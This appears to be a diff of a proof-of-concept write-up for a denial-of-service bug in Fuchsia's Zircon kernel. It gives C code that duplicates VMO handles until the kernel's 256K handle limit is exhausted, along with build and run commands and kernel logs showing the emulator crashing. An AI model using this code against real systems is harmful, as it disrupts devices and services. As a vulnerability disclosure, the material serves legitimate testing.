@@ -1,22 +1,21 @@
 # Dos on Fuchsia
 
-May only take you 1 min.
+May take you only 1 min.
 
 ## Set-up
 
 
-Replace "/examples/hello_world/cpp/helloworld.cc" with the following code.
+Replace "/examples/fortune/fortune.c" with the following code.
 
 // Get a handle by calling  zx_vmo_create, then call zx_handle_duplicate to duplicate the handle. 
 
 // Here I try to duplicate 512\*1024 handles, while the max number of handles is initialized as 256\*1024 in _arena.Init().
 
-    #include  <zircon/syscalls.h>
-	#include  <iostream>
+	#include <stdio.h>
+	#include  <zircon/syscalls.h>
 	#define  max_num  512*1024
 	zx_handle_t  res_handle[max_num];
 	int  main() {
-		std::cout  <<  "Hello, Worldddddd!\n";
 		zx_handle_t  handle1;
 		zx_status_t  sys_ret;
 		sys_ret = zx_vmo_create(10,0,&handle1);
@@ -75,7 +74,7 @@ Open four terminals.
 
 Terminal 1
 
-    $ fx set workstation.qemu-x64 --cache --with //example/hello_world
+    $ fx set workstation.qemu-x64 --cache --with //example/fortune
     $ fx build
     $ fx vdl start -N -u FUCHSIA_ROOT/scripts/start-unsecure-internet.sh
 
@@ -87,15 +86,33 @@ Terminal 3
 
     $ fx log
 
-Terminal 4
-	
-
-   ```
-$ ffx component run fuchsia-pkg://fuchsia.com/hello-world#meta/hello-world-cpp.cm
+Terminal 1
+```
+$ fortune
 ```
 
+
 ## Result
-Warnning in Terminal 2, on my machine the FEMU will crash.
+Warnning in Terminal 3, then the FEMU crash.
+
+Terminal 3
+```
+[00016.023134][57943][57945][klog] WARNING: WARNING: High handle count: 229377 / 229376 handles
+[00016.029523][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
+[00016.029527][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
+[00016.029528][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
+[00016.029528][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
+[00016.029529][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
+[00016.029529][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
+[00016.029530][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
+[00016.029530][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
+[00016.029532][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
+[00016.029535][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
+[00016.029536][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
+[00016.029538][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
+[00016.029575][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
+```
+You can see that now the number of exsiting handles is 256\*1024 = 262144, or the max number of handles.
 
 Terminal 1
 ```
@@ -111,20 +128,5 @@ kex_exchange_identification: Connection closed by remote host
 kex_exchange_identification: Connection closed by remote host
 kex_exchange_identification: Connection closed by remote host
 kex_exchange_identification: Connection closed by remote host
-
-```
-
-If you set the 'max_num' value to a small value like 10 in hello_world.cc, the FEMU can still work with the hello_world component. It means that it's feasible to  Dos attack the zircon kernel by loading malicious components. 
-
-```
-PID      TID        TIME%  CPU STATE NAME
-59937    59939      99.99    3   run hello-world-cpp.cm:initial-thread
-26905    26907       0.46    0 block ptysvc.cm:initial-thread
-36894    37138       0.45    0 block netstack.cmx:pthread_t:0x18720985b18
- 6658     7948       0.43    2 block driver_host:composite-device:virtio-net-irq-worker
-54060    54062       0.38    2 block /pkg/bin/sshd:initial-thread
-77419    77421       0.36    0   run top:initial-thread
-36894    37148       0.35    2 block netstack.cmx:pthread_t:0x90d20f1b18
-36894    37161       0.27    2 block netstack.cmx:pthread_t:0x1e2b9737b18
 
 ```
